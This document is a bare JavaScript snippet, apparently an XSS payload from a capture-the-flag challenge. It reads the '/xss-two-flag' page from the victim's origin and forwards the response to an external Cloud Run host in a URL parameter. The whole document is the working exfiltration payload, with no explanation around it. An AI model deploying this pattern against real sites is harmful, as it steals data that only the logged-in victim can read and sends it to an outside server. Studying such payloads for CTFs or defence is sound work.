var xhr = new XMLHttpRequest();
xhr.open('GET',location.origin + '/xss-two-flag',true);
xhr.onload = function () {
var request = new XMLHttpRequest();
request.open('GET','https://store-flag-808630243113.us-central1.run.app?flag=' + xhr.responseText,true);
request.send()};
xhr.send(null);